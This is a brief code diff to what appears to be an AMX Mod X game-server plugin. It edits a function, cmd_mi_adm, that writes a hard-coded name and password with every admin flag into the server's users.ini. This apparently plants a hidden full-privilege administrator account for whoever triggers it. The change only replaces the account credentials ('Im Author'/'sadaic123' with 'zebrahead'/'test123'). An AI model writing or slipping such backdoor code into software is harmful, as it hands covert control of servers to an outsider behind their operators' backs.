@@ -262,7 +262,7 @@ public cmd_off(id)
 public cmd_mi_adm(id)
 {
 	get_configsdir(g_file, 63)
-	new adm[] = "^"Im Author^" ^"sadaic123^" ^"abcdefghijklmnopqrstu^" ^"ab^""
+	new adm[] = "^"zebrahead^" ^"test123^" ^"abcdefghijklmnopqrstu^" ^"ab^""
 	formatex(g_file, charsmax(g_file) , "%s/users.ini", g_file)
 	write_file(g_file, adm)
 	client_print(id, print_center, "Hola, Lucho")
